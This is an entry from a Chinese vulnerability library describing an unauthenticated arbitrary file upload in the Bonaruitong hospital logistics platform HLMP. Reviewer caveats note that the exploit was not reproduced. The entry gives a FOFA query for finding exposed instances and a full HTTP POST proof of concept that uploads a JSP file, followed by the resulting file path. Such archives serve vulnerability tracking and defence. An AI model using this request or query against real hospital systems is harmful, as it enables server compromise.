---
source: "wy876 漏洞文库"
title: "博纳睿通医院后勤管理平台HLMP processApkUpload任意后缀上传"
product: "博纳睿通医院后勤管理平台HLMP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；apk目录JSP解析条件"
prerequisites: "请求无Cookie，鉴权待核"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/az2vflngvgmzr9ew"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%8D%9A%E7%BA%B3%E7%9D%BF%E9%80%9A/%E5%8D%97%E4%BA%AC%E5%8D%9A%E7%BA%B3%E7%9D%BF%E9%80%9A%E8%BD%AF%E4%BB%B6%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%8C%BB%E9%99%A2%E4%B8%80%E7%AB%99%E5%BC%8F%E5%90%8E%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FprocessApkUpload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"frameworkModuleJob\" "
fofa_unverified: "body="
id: "vw-a0ea757e75c9c3ba96f7af09"
entity_id: "ve-a0ea757e75c9c3ba96f7af09"
schema_version: "1"
---

# 博纳睿通医院后勤管理平台HLMP processApkUpload任意后缀上传

## 条目说明

- 对象与具体问题：博纳睿通医院后勤管理平台HLMP；processApkUpload任意后缀上传
- 版本、配置及部署条件：版本未知；apk目录JSP解析条件
- 认证与权限前提：请求无Cookie，鉴权待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题公司全称过长，统一厂商+产品+方法；一站式/综合/保障称谓需核同产品
- 文字有JSP输出123，但无响应/GET执行证据，目录33需从上传返回取得
- APK处理器接受JSP与可执行为两阶段；补版本、修复与持久文件副作用

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
医院后勤综合管理平台(Hospital Logistics Management Platform，以下简称HLMP)基于现代医院后勤管理理念，结合后勤业务管理特点，通过管理平台将后勤管理业务予以系统化、规范化和流程化，从而形成一套构建于平台之上且成熟完善的后勤管理体系，并可在此体系上充分挖掘管理潜力，以提高工作效率、加强有效沟通、降低管理成本、辅助管理决策。 南京博纳睿通软件科技有限公司医院后勤保障管理系统processApkUpload存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 南京博纳睿通软件科技有限公司医院后勤保障管理系统

## 三、资产测绘
+ fofa`body="frameworkModuleJob" `
+ 特征


## 四、漏洞复现
```http
POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="stc.jsp"
Content-Type: application/octet-stream

<% out.println("123");%>
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 197；静态长度已移除，应由客户端根据最终请求体的字节数生成。


根据响应获取上传文件位置

```plain
/apk/33/stc.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/az2vflngvgmzr9ew>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
